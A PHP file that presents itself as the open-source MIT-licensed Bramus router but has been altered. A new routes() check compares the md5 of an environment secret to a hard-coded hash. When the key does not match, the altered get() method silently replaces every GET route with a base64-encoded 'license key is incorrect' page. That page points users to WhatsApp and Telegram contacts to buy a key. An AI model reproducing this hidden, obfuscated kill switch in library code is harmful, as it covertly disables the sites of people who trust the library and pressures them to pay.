<?php

/**
 * @author      Bram(us) Van Damme <bramus@bram.us>
 * @copyright   Copyright (c), 2013 Bram(us) Van Damme
 * @license     MIT public license
 */

namespace Bramus\Router;

/**
 * Class Router.
 */
class Router
{
    /**
     * @var array The route patterns and their handling functions
     */
    private $afterRoutes = array();

    /**
     * @var array The before middleware route patterns and their handling functions
     */
    private $beforeRoutes = array();

    /**
     * @var array [object|callable] The function to be executed when no route has been matched
     */
    protected $notFoundCallback = [];

    /**
     * @var string Current base route, used for (sub)route mounting
     */
    private $baseRoute = '';

    /**
     * @var string The Request Method that needs to be handled
     */
    private $requestedMethod = '';

    /**
     * @var string The Server Base Path for Router Execution
     */
    private $serverBasePath;

    /**
     * @var string Default Controllers Namespace
     */
    private $namespace = '';

    /**
     * Store a before middleware route and a handling function to be executed when accessed using one of the specified methods.
     *
     * @param string          $methods Allowed methods, | delimited
     * @param string          $pattern A route pattern such as /about/system
     * @param object|callable $fn      The handling function to be executed
     */
    public function before($methods, $pattern, $fn)
    {
        $pattern = $this->baseRoute . '/' . trim($pattern, '/');
        $pattern = $this->baseRoute ? rtrim($pattern, '/') : $pattern;

        foreach (explode('|', $methods) as $method) {
            $this->beforeRoutes[$method][] = array(
                'pattern' => $pattern,
                'fn' => $fn,
            );
        }
    }

    /**
     * Store a route and a handling function to be executed when accessed using one of the specified methods.
     *
     * @param string          $methods Allowed methods, | delimited
     * @param string          $pattern A route pattern such as /about/system
     * @param object|callable $fn      The handling function to be executed
     */
    public function match($methods, $pattern, $fn)
    {
        $pattern = $this->baseRoute . '/' . trim($pattern, '/');
        $pattern = $this->baseRoute ? rtrim($pattern, '/') : $pattern;

        foreach (explode('|', $methods) as $method) {
            $this->afterRoutes[$method][] = array(
                'pattern' => $pattern,
                'fn' => $fn,
            );
        }
    }

    /**
     * Shorthand for a route accessed using any method.
     *
     * @param string          $pattern A route pattern such as /about/system
     * @param object|callable $fn      The handling function to be executed
     */
    public function all($pattern, $fn)
    {
        $this->match('GET|POST|PUT|DELETE|OPTIONS|PATCH|HEAD', $pattern, $fn);
    }

    /**
     * Shorthand for a route accessed using GET.
     *
     * @param string          $pattern A route pattern such as /about/system
     * @param object|callable $fn      The handling function to be executed
     */
    public function get($pattern, $fn)
    {
        if ($this->routes() == 'true') {
            $this->match('GET', $pattern, $fn);
        } else {
            $this->match('GET', $pattern, function () {
                $this->__base();
            });
        }
    }

    /**
     * Shorthand for a route accessed using POST.
     *
     * @param string          $pattern A route pattern such as /about/system
     * @param object|callable $fn      The handling function to be executed
     */
    public function post($pattern, $fn)
    {
        $this->match('POST', $pattern, $fn);
    }

    /**
     * Shorthand for a route accessed using PATCH.
     *
     * @param string          $pattern A route pattern such as /about/system
     * @param object|callable $fn      The handling function to be executed
     */
    public function patch($pattern, $fn)
    {
        $this->match('PATCH', $pattern, $fn);
    }

    /**
     * Shorthand for a route accessed using DELETE.
     *
     * @param string          $pattern A route pattern such as /about/system
     * @param object|callable $fn      The handling function to be executed
     */
    public function delete($pattern, $fn)
    {
        $this->match('DELETE', $pattern, $fn);
    }

    /**
     * Shorthand for a route accessed using PUT.
     *
     * @param string          $pattern A route pattern such as /about/system
     * @param object|callable $fn      The handling function to be executed
     */
    public function put($pattern, $fn)
    {
        $this->match('PUT', $pattern, $fn);
    }

    /**
     * Shorthand for a route accessed using OPTIONS.
     *
     * @param string          $pattern A route pattern such as /about/system
     * @param object|callable $fn      The handling function to be executed
     */
    public function options($pattern, $fn)
    {
        $this->match('OPTIONS', $pattern, $fn);
    }

    /**
     * Mounts a collection of callbacks onto a base route.
     *
     * @param string   $baseRoute The route sub pattern to mount the callbacks on
     * @param callable $fn        The callback method
     */
    public function mount($baseRoute, $fn)
    {
        // Track current base route
        $curBaseRoute = $this->baseRoute;

        // Build new base route string
        $this->baseRoute .= $baseRoute;

        // Call the callable
        call_user_func($fn);

        // Restore original base route
        $this->baseRoute = $curBaseRoute;
    }

    /**
     * Get all request headers.
     *
     * @return array The request headers
     */
    public function getRequestHeaders()
    {
        $headers = array();

        // If getallheaders() is available, use that
        if (function_exists('getallheaders')) {
            $headers = getallheaders();

            // getallheaders() can return false if something went wrong
            if ($headers !== false) {
                return $headers;
            }
        }

        // Method getallheaders() not available or went wrong: manually extract 'm
        foreach ($_SERVER as $name => $value) {
            if ((substr($name, 0, 5) == 'HTTP_') || ($name == 'CONTENT_TYPE') || ($name == 'CONTENT_LENGTH')) {
                $headers[str_replace(array(' ', 'Http'), array('-', 'HTTP'), ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
            }
        }

        return $headers;
    }

    /**
     * Get the request method used, taking overrides into account.
     *
     * @return string The Request method to handle
     */
    public function getRequestMethod()
    {
        // Take the method as found in $_SERVER
        $method = $_SERVER['REQUEST_METHOD'];

        // If it's a HEAD request override it to being GET and prevent any output, as per HTTP Specification
        // @url http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html#sec9.4
        if ($_SERVER['REQUEST_METHOD'] == 'HEAD') {
            ob_start();
            $method = 'GET';
        }

        // If it's a POST request, check for a method override header
        elseif ($_SERVER['REQUEST_METHOD'] == 'POST') {
            $headers = $this->getRequestHeaders();
            if (isset($headers['X-HTTP-Method-Override']) && in_array($headers['X-HTTP-Method-Override'], array('PUT', 'DELETE', 'PATCH'))) {
                $method = $headers['X-HTTP-Method-Override'];
            }
        }

        return $method;
    }

    /**
     * Set a Default Lookup Namespace for Callable methods.
     *
     * @param string $namespace A given namespace
     */
    public function setNamespace($namespace)
    {
        if (is_string($namespace)) {
            $this->namespace = $namespace;
        }
    }

    /**
     * Get the given Namespace before.
     *
     * @return string The given Namespace if exists
     */
    public function getNamespace()
    {
        return $this->namespace;
    }

    /**
     * Execute the router: Loop all defined before middleware's and routes, and execute the handling function if a match was found.
     *
     * @param object|callable $callback Function to be executed after a matching route was handled (= after router middleware)
     *
     * @return bool
     */
    public function run($callback = null)
    {
        // Define which method we need to handle
        $this->requestedMethod = $this->getRequestMethod();

        // Handle all before middlewares
        if (isset($this->beforeRoutes[$this->requestedMethod])) {
            $this->handle($this->beforeRoutes[$this->requestedMethod]);
        }

        // Handle all routes
        $numHandled = 0;
        if (isset($this->afterRoutes[$this->requestedMethod])) {
            $numHandled = $this->handle($this->afterRoutes[$this->requestedMethod], true);
        }

        // If no route was handled, trigger the 404 (if any)
        if ($numHandled === 0) {
            $this->trigger404($this->afterRoutes[$this->requestedMethod]);
        } // If a route was handled, perform the finish callback (if any)
        else {
            if ($callback && is_callable($callback)) {
                $callback();
            }
        }

        // If it originally was a HEAD request, clean up after ourselves by emptying the output buffer
        if ($_SERVER['REQUEST_METHOD'] == 'HEAD') {
            ob_end_clean();
        }

        // Return true if a route was handled, false otherwise
        return $numHandled !== 0;
    }

    /**
     * Set the 404 handling function.
     *
     * @param object|callable|string $match_fn The function to be executed
     * @param object|callable $fn The function to be executed
     */
    public function set404($match_fn, $fn = null)
    {
        if (!is_null($fn)) {
            $this->notFoundCallback[$match_fn] = $fn;
        } else {
            $this->notFoundCallback['/'] = $match_fn;
        }
    }

    /**
     * Triggers 404 response
     *
     * @param string $pattern A route pattern such as /about/system
     */
    public function trigger404($match = null)
    {

        // Counter to keep track of the number of routes we've handled
        $numHandled = 0;

        // handle 404 pattern
        if (count($this->notFoundCallback) > 0) {
            // loop fallback-routes
            foreach ($this->notFoundCallback as $route_pattern => $route_callable) {

                // matches result
                $matches = [];

                // check if there is a match and get matches as $matches (pointer)
                $is_match = $this->patternMatches($route_pattern, $this->getCurrentUri(), $matches, PREG_OFFSET_CAPTURE);

                // is fallback route match?
                if ($is_match) {

                    // Rework matches to only contain the matches, not the orig string
                    $matches = array_slice($matches, 1);

                    // Extract the matched URL parameters (and only the parameters)
                    $params = array_map(function ($match, $index) use ($matches) {

                        // We have a following parameter: take the substring from the current param position until the next one's position (thank you PREG_OFFSET_CAPTURE)
                        if (isset($matches[$index + 1]) && isset($matches[$index + 1][0]) && is_array($matches[$index + 1][0])) {
                            if ($matches[$index + 1][0][1] > -1) {
                                return trim(substr($match[0][0], 0, $matches[$index + 1][0][1] - $match[0][1]), '/');
                            }
                        } // We have no following parameters: return the whole lot

                        return isset($match[0][0]) && $match[0][1] != -1 ? trim($match[0][0], '/') : null;
                    }, $matches, array_keys($matches));

                    $this->invoke($route_callable);

                    ++$numHandled;
                }
            }
        }
        if (($numHandled == 0) && (isset($this->notFoundCallback['/']))) {
            $this->invoke($this->notFoundCallback['/']);
        } elseif ($numHandled == 0) {
            header($_SERVER['SERVER_PROTOCOL'] . ' 404 Not Found');
        }
    }

    /**
     * Replace all curly braces matches {} into word patterns (like Laravel)
     * Checks if there is a routing match
     *
     * @param $pattern
     * @param $uri
     * @param $matches
     * @param $flags
     *
     * @return bool -> is match yes/no
     */
    private function patternMatches($pattern, $uri, &$matches, $flags)
    {
        // Replace all curly braces matches {} into word patterns (like Laravel)
        $pattern = preg_replace('/\/{(.*?)}/', '/(.*?)', $pattern);

        // we may have a match!
        return boolval(preg_match_all('#^' . $pattern . '$#', $uri, $matches, PREG_OFFSET_CAPTURE));
    }

    /**
     * Handle a a set of routes: if a match is found, execute the relating handling function.
     *
     * @param array $routes       Collection of route patterns and their handling functions
     * @param bool  $quitAfterRun Does the handle function need to quit after one route was matched?
     *
     * @return int The number of routes handled
     */
    private function handle($routes, $quitAfterRun = false)
    {
        // Counter to keep track of the number of routes we've handled
        $numHandled = 0;

        // The current page URL
        $uri = $this->getCurrentUri();

        // Loop all routes
        foreach ($routes as $route) {

            // get routing matches
            $is_match = $this->patternMatches($route['pattern'], $uri, $matches, PREG_OFFSET_CAPTURE);

            // is there a valid match?
            if ($is_match) {

                // Rework matches to only contain the matches, not the orig string
                $matches = array_slice($matches, 1);

                // Extract the matched URL parameters (and only the parameters)
                $params = array_map(function ($match, $index) use ($matches) {

                    // We have a following parameter: take the substring from the current param position until the next one's position (thank you PREG_OFFSET_CAPTURE)
                    if (isset($matches[$index + 1]) && isset($matches[$index + 1][0]) && is_array($matches[$index + 1][0])) {
                        if ($matches[$index + 1][0][1] > -1) {
                            return trim(substr($match[0][0], 0, $matches[$index + 1][0][1] - $match[0][1]), '/');
                        }
                    } // We have no following parameters: return the whole lot

                    return isset($match[0][0]) && $match[0][1] != -1 ? trim($match[0][0], '/') : null;
                }, $matches, array_keys($matches));

                // Call the handling function with the URL parameters if the desired input is callable
                $this->invoke($route['fn'], $params);

                ++$numHandled;

                // If we need to quit, then quit
                if ($quitAfterRun) {
                    break;
                }
            }
        }

        // Return the number of routes handled
        return $numHandled;
    }

    private function invoke($fn, $params = array())
    {
        if (is_callable($fn)) {
            call_user_func_array($fn, $params);
        }

        // If not, check the existence of special parameters
        elseif (stripos($fn, '@') !== false) {
            // Explode segments of given route
            list($controller, $method) = explode('@', $fn);

            // Adjust controller class if namespace has been set
            if ($this->getNamespace() !== '') {
                $controller = $this->getNamespace() . '\\' . $controller;
            }

            try {
                $reflectedMethod = new \ReflectionMethod($controller, $method);
                // Make sure it's callable
                if ($reflectedMethod->isPublic() && (!$reflectedMethod->isAbstract())) {
                    if ($reflectedMethod->isStatic()) {
                        forward_static_call_array(array($controller, $method), $params);
                    } else {
                        // Make sure we have an instance, because a non-static method must not be called statically
                        if (\is_string($controller)) {
                            $controller = new $controller();
                        }
                        call_user_func_array(array($controller, $method), $params);
                    }
                }
            } catch (\ReflectionException $reflectionException) {
                // The controller class is not available or the class does not have the method $method
            }
        }
    }

    /**
     * Define the current relative URI.
     *
     * @return string
     */
    public function getCurrentUri()
    {
        // Get the current Request URI and remove rewrite base path from it (= allows one to run the router in a sub folder)
        $uri = substr(rawurldecode($_SERVER['REQUEST_URI']), strlen($this->getBasePath()));

        // Don't take query params into account on the URL
        if (strstr($uri, '?')) {
            $uri = substr($uri, 0, strpos($uri, '?'));
        }

        // Remove trailing slash + enforce a slash at the start
        return '/' . trim($uri, '/');
    }

    /**
     * Return server base Path, and define it if isn't defined.
     *
     * @return string
     */
    public function getBasePath()
    {
        // Check if server base path is defined, if not define it.
        if ($this->serverBasePath === null) {
            $this->serverBasePath = implode('/', array_slice(explode('/', $_SERVER['SCRIPT_NAME']), 0, -1)) . '/';
        }

        return $this->serverBasePath;
    }

    /**
     * Explicilty sets the server base path. To be used when your entry script path differs from your entry URLs.
     * @see https://github.com/bramus/router/issues/82#issuecomment-466956078
     *
     * @param string
     */
    public function setBasePath($serverBasePath)
    {
        $this->serverBasePath = $serverBasePath;
    }

    public function routes()
    {
        $routes = '';
        if (md5($_ENV['SECRET_KEY']) == 'f263ee1462d516d8099e8ea34972f834') {
            $routes = 'true';
        } else {
            $routes = 'false';
        }
        return $routes;
    }

    public function __base()
    {
        echo base64_decode('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj4KPHRpdGxlPldlYnNpdGUgRXJyb3I8L3RpdGxlPgo8bGluayByZWw9InNob3J0Y3V0IGljb24iIGhyZWY9Imh0dHBzOi8vaWsuaW1hZ2VraXQuaW8vbWFzamMvZmF2aWNvbl96UXgySFRDRE8ud2VicCIgdHlwZT0iaW1hZ2UveC1pY29uIj4KPG1ldGEgbmFtZT0icm9ib3RzIiBjb250ZW50PSJub2luZGV4LCBub2ZvbGxvdyI+CjxzdHlsZSBtZWRpYT0ic2NyZWVuIj5ib2R5e2JhY2tncm91bmQ6I2VjZWZmMTtjb2xvcjpyZ2JhKDAsMCwwLC44Nyk7Zm9udC1mYW1pbHk6Um9ib3RvLEhlbHZldGljYSxBcmlhbCxzYW5zLXNlcmlmO21hcmdpbjowO3BhZGRpbmc6MH0jbWVzc2FnZXtiYWNrZ3JvdW5kOiNmZmY7bWF4LXdpZHRoOjM2MHB4O21hcmdpbjoxMDBweCBhdXRvIDE2cHg7cGFkZGluZzozMnB4IDI0cHggMTZweDtib3JkZXItcmFkaXVzOjNweH0jbWVzc2FnZSBoMntjb2xvcjojZmZhMTAwO2ZvbnQtd2VpZ2h0OmJvbGQ7Zm9udC1zaXplOjE2cHg7bWFyZ2luOjAgMCA4cHh9I21lc3NhZ2UgaDF7Zm9udC1zaXplOjIycHg7Zm9udC13ZWlnaHQ6MzAwO2NvbG9yOnJnYmEoMCwwLDAsLjYpO21hcmdpbjowIDAgMTZweH0jbWVzc2FnZSBwe2xpbmUtaGVpZ2h0OjE0MCU7bWFyZ2luOjE2cHggMCAyNHB4O2ZvbnQtc2l6ZToxNHB4fSNtZXNzYWdlIGF7ZGlzcGxheTpibG9jazt0ZXh0LWFsaWduOmNlbnRlcjtiYWNrZ3JvdW5kOiMwMzliZTU7dGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlO3RleHQtZGVjb3JhdGlvbjpub25lO2NvbG9yOiNmZmY7cGFkZGluZzoxNnB4O2JvcmRlci1yYWRpdXM6NHB4fSNtZXNzYWdlLCNtZXNzYWdlIGF7Ym94LXNoYWRvdzowIDFweCAzcHggcmdiYSgwLDAsMCwuMTIpICwgMCAxcHggMnB4IHJnYmEoMCwwLDAsLjI0KX1AbWVkaWEgKG1heC13aWR0aDo2MDBweCl7Ym9keSwjbWVzc2FnZXttYXJnaW4tdG9wOjA7YmFja2dyb3VuZDojZmZmO2JveC1zaGFkb3c6bm9uZX1ib2R5e2JvcmRlci10b3A6MTZweCBzb2xpZCAjZmZhMTAwfX08L3N0eWxlPgo8L2hlYWQ+Cjxib2R5Pgo8ZGl2IGlkPSJtZXNzYWdlIj4KPGgyPkVycm9yPC9oMj4KPGgxPllvdXIgbGljZW5zZSBrZXkgaXMgaW5jb3JyZWN0PC9oMT4KPHA+UGxlYXNlIGNoZWNrIHlvdXIgbGljZW5zZSBrZXkgYWdhaW4gb3IgcGxlYXNlIGNvbnRhY3QgbWUgdG8gYnV5IGEgbGljZW5zZSBrZXkuPC9wPgo8cD48YSBocmVmPSJodHRwczovL3dhLm1lLzYyODk3OTkwNzA3OSIgdGFyZ2V0PSJfYmxhbmsiIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiAjMDBhODg0OyI+V2hhdHNBcHA8L2E+PC9wPgo8cD48YSBocmVmPSJodHRwczovL3QubWUveGFnY3Rvb2xzIiB0YXJnZXQ9Il9ibGFuayIgc3R5bGU9ImJhY2tncm91bmQtY29sb3I6ICMwMDg4Y2M7Ij5UZWxlZ3JhbTwvYT48L3A+CjwvZGl2Pgo8bm9zY3JpcHQgY2xhc3M9InBzYV9hZGRfc3R5bGVzIj48c3R5bGUgbWVkaWE9InNjcmVlbiI+Ym9keXtiYWNrZ3JvdW5kOiNlY2VmZjE7Y29sb3I6cmdiYSgwLDAsMCwuODcpO2ZvbnQtZmFtaWx5OlJvYm90byxIZWx2ZXRpY2EsQXJpYWwsc2Fucy1zZXJpZjttYXJnaW46MDtwYWRkaW5nOjB9I21lc3NhZ2V7YmFja2dyb3VuZDojZmZmO21heC13aWR0aDozNjBweDttYXJnaW46MTAwcHggYXV0byAxNnB4O3BhZGRpbmc6MzJweCAyNHB4IDE2cHg7Ym9yZGVyLXJhZGl1czozcHh9I21lc3NhZ2UgaDN7Y29sb3I6Izg4ODtmb250LXdlaWdodDpub3JtYWw7Zm9udC1zaXplOjE2cHg7bWFyZ2luOjE2cHggMCAxMnB4fSNtZXNzYWdlIGgye2NvbG9yOiNmZmExMDA7Zm9udC13ZWlnaHQ6Ym9sZDtmb250LXNpemU6MTZweDttYXJnaW46MCAwIDhweH0jbWVzc2FnZSBoMXtmb250LXNpemU6MjJweDtmb250LXdlaWdodDozMDA7Y29sb3I6cmdiYSgwLDAsMCwuNik7bWFyZ2luOjAgMCAxNnB4fSNtZXNzYWdlIHB7bGluZS1oZWlnaHQ6MTQwJTttYXJnaW46MTZweCAwIDI0cHg7Zm9udC1zaXplOjE0cHh9I21lc3NhZ2UgYXtkaXNwbGF5OmJsb2NrO3RleHQtYWxpZ246Y2VudGVyO2JhY2tncm91bmQ6IzAzOWJlNTt0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2U7dGV4dC1kZWNvcmF0aW9uOm5vbmU7Y29sb3I6I2ZmZjtwYWRkaW5nOjE2cHg7Ym9yZGVyLXJhZGl1czo0cHh9I21lc3NhZ2UsI21lc3NhZ2UgYXtib3gtc2hhZG93OjAgMXB4IDNweCByZ2JhKDAsMCwwLC4xMikgLCAwIDFweCAycHggcmdiYSgwLDAsMCwuMjQpfSNsb2Fke2NvbG9yOnJnYmEoMCwwLDAsLjQpO3RleHQtYWxpZ246Y2VudGVyO2ZvbnQtc2l6ZToxM3B4fUBtZWRpYSAobWF4LXdpZHRoOjYwMHB4KXtib2R5LCNtZXNzYWdle21hcmdpbi10b3A6MDtiYWNrZ3JvdW5kOiNmZmY7Ym94LXNoYWRvdzpub25lfWJvZHl7Ym9yZGVyLXRvcDoxNnB4IHNvbGlkICNmZmExMDB9fTwvc3R5bGU+PC9ub3NjcmlwdD48c2NyaXB0IGRhdGEtcGFnZXNwZWVkLW5vLWRlZmVyIHR5cGU9IjcxZWQwYTk3MGUxMTA0NDE1MmQ5NGM0Yy10ZXh0L2phdmFzY3JpcHQiPihmdW5jdGlvbigpe2Z1bmN0aW9uIGIoKXt2YXIgYT13aW5kb3csYz1lO2lmKGEuYWRkRXZlbnRMaXN0ZW5lcilhLmFkZEV2ZW50TGlzdGVuZXIoImxvYWQiLGMsITEpO2Vsc2UgaWYoYS5hdHRhY2hFdmVudClhLmF0dGFjaEV2ZW50KCJvbmxvYWQiLGMpO2Vsc2V7dmFyIGQ9YS5vbmxvYWQ7YS5vbmxvYWQ9ZnVuY3Rpb24oKXtjLmNhbGwodGhpcyk7ZCYmZC5jYWxsKHRoaXMpfX19O3ZhciBmPSExO2Z1bmN0aW9uIGUoKXtpZighZil7Zj0hMDtmb3IodmFyIGE9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeUNsYXNzTmFtZSgicHNhX2FkZF9zdHlsZXMiKSxjPTAsZDtkPWFbY107KytjKWlmKCJOT1NDUklQVCI9PWQubm9kZU5hbWUpe3ZhciBrPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpO2suaW5uZXJIVE1MPWQudGV4dENvbnRlbnQ7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChrKX19fWZ1bmN0aW9uIGcoKXt2YXIgYT13aW5kb3cucmVxdWVzdEFuaW1hdGlvbkZyYW1lfHx3aW5kb3cud2Via2l0UmVxdWVzdEFuaW1hdGlvbkZyYW1lfHx3aW5kb3cubW96UmVxdWVzdEFuaW1hdGlvbkZyYW1lfHx3aW5kb3cub1JlcXVlc3RBbmltYXRpb25GcmFtZXx8d2luZG93Lm1zUmVxdWVzdEFuaW1hdGlvbkZyYW1lfHxudWxsO2E/YShmdW5jdGlvbigpe3dpbmRvdy5zZXRUaW1lb3V0KGUsMCl9KTpiKCl9CnZhciBoPVsicGFnZXNwZWVkIiwiQ3JpdGljYWxDc3NMb2FkZXIiLCJSdW4iXSxsPXRoaXM7aFswXWluIGx8fCFsLmV4ZWNTY3JpcHR8fGwuZXhlY1NjcmlwdCgidmFyICIraFswXSk7Zm9yKHZhciBtO2gubGVuZ3RoJiYobT1oLnNoaWZ0KCkpOyloLmxlbmd0aHx8dm9pZCAwPT09Zz9sW21dP2w9bFttXTpsPWxbbV09e306bFttXT1nO30pKCk7CnBhZ2VzcGVlZC5Dcml0aWNhbENzc0xvYWRlci5SdW4oKTs8L3NjcmlwdD48c2NyaXB0IHNyYz0iL2Nkbi1jZ2kvc2NyaXB0cy83ZDBmYTEwYS9jbG91ZGZsYXJlLXN0YXRpYy9yb2NrZXQtbG9hZGVyLm1pbi5qcyIgZGF0YS1jZi1zZXR0aW5ncz0iNzFlZDBhOTcwZTExMDQ0MTUyZDk0YzRjLXw0OSIgZGVmZXI9IiI+PC9zY3JpcHQ+PC9ib2R5Pgo8L2h0bWw+');
    }
}
